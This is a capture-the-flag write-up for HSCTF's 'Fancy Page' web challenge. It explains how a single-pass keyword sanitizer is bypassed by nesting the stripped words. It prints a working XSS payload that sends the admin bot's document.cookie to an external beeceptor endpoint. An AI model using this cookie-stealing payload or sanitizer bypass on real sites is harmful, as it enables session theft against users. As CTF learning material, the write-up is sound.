# Fancy Page

## Description

web/fancy-page (by hmmm) | 436 points

[http://fancy-page.hsctf.com](http://fancy-page.hsctf.com/)

Downloads: [fancy-page.zip](https://hsctf-10-resources.storage.googleapis.com/uploads/b953fd4d6d7423374872f73b969955d9fb52781776c9ed1c303abb18250d2eb6/fancy-page.zip)

## Analysis

Fancy Page™ is a website which allows us to write content which is shareable.

Website allows html tags which means possible XSS attack.
![fancy-page-1](/assets/ctf/hsctf/fancy-page-1.png)

There's also share button [Show us what you've created!](http://admin-bot.hsctf.com/fancy-page), which means that (*most likely*) we will need a cookie stealer XSS.

**[display.js](http://fancy-page.hsctf.com/scripts/display.js)** sanitizes some keyword which could prevent XSS payloads.

```js
function sanitize(content) {
	return content.replace(/script|on|iframe|object|embed|cookie/gi, "");
}
```

Sanitize happens only once
```js
let sanitized = sanitize(Arg("content"));
content.innerHTML = sanitized;
```
## Solution

I used [Reflected Steal Cookie](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md) to create an XSS payload and [beeceptor](https://beeceptor.com) to inspect requests.

```html
<img src=UwU oonnerror="this.src='https://klgrthio.free.beeceptor.com?'+document.coocookiekie; this.removeAttribute('oonnerror');">
```
`oonnerror` and such are writter like  this because when `sanitize` functions removes this what is left is `onerror` which triggers the XSS.

Finally we share the URL and get the flag.
![fancy-page-2](/assets/ctf/hsctf/fancy-page-2.png)
